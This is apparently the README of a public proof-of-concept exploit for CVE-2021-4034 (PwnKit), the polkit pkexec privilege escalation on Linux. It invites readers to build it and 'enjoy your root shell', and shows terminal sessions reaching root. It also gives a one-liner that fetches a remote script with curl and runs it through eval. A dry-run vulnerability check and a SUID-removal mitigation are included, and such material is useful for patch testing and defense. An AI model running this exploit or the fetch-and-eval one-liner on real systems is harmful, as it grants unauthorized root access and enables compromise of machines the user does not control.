# CVE-2021-4034
One day for the polkit privilege escalation exploit

Just execute `make`, `./cve-2021-4034` and enjoy your root shell.

The original advisory by the real authors is [here](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)

## PoC
If the exploit is working you'll get a root shell immediately:

```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# exit
```

Updating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit:
```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$
```

## Dry Run
To not execute a shell but just test if the system is vulnerable compile the `dry-run` target.

If the program exit printing "root" it means that your system is vulnerable to the exploit.
```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run
...
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
root
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
1
```

If your system is not vulnerable it prints an error and exit.
```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
0
```

## About Polkit pkexec for Linux

Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).

# One-liner commands

You can easily exploit the system using a single script, downloadable and executable with this command:

```sh
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
```

```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ whoami
vagrant
vagrant@ubuntu-impish:~/CVE-2021-4034$ eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
# whoami
root
```

# Mitigation

If no patches are available for your operating system, you can remove the SUID-bit from pkexec as a temporary mitigation.
```bash
# chmod 0755 /usr/bin/pkexec
```

The exploit then will fail complaining that `pkexec` must have the
setuid bit enabled.
```bash
vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ sudo chmod 0755 /usr/bin/pkexec
vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ ./cve-2021-4034
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec must be setuid root
```

